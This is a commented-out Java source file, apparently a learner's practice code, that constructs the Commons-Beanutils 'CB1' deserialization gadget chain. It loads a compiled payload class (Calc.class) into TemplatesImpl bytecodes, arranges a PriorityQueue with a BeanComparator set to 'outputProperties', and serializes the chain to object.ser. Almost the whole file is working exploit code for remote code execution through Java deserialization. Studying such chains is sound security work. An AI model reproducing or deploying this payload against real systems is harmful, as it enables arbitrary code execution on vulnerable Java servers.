//
//public class TestCB1 {
//    // 参考CC3和CC4
//    public static void main(String[] args) throws Exception{
////        JavaBean bean = new JavaBean();
////        System.out.println("name = "+ PropertyUtils.getProperty(bean,"name"));
//        TemplatesImpl templates = new TemplatesImpl();
//        setFieldValue(templates,"_name","Jasper");
//        byte[] code = Files.readAllBytes(Paths.get("D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class"));
//        byte[][] codes = {code};
//        setFieldValue(templates,"_bytecodes",codes);
//        // 提前触发链条看效果，就要设置_tfactory
////        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
////        templates.newTransformer();
////        templates.getOutputProperties();
////        PropertyUtils.getProperty(templates,"outputProperties");
//
//        BeanComparator beanComparator = new BeanComparator();
////        setFieldValue(beanComparator,"property","outputProperties");
////        beanComparator.compare(templates,templates);
//
////        // add会提前触发链条，这里选择先提前add，再统一传参
//        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);
//        priorityQueue.add(1);
//        priorityQueue.add(2);
////        // 统一传参，防止链条被破坏
//        setFieldValue(priorityQueue,"queue",new TemplatesImpl[]{templates,templates});
//        setFieldValue(beanComparator,"property","outputProperties");
////
//        serialize(priorityQueue);
//        // unserialize();
//
//    }
//    public static void serialize(Object o) throws Exception{
//        FileOutputStream fos = new FileOutputStream("object.ser");
//        ObjectOutputStream os = new ObjectOutputStream(fos);
//        os.writeObject(o);
//
//        System.out.println("序列化完成...");
//    }
//
//    public static void unserialize() throws Exception{
//        FileInputStream fis = new FileInputStream("object.ser");
//        ObjectInputStream ois = new ObjectInputStream(fis);
//        //反序列化执行readObject()方法
//        Object o =  ois.readObject();
//        ois.close();
//        fis.close();
//
//        System.out.println("反序列化完成...");
//    }
//
//    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
//        Field field = obj.getClass().getDeclaredField(fieldName);
//        field.setAccessible(true);
//        field.set(obj, value);
//    }
//}
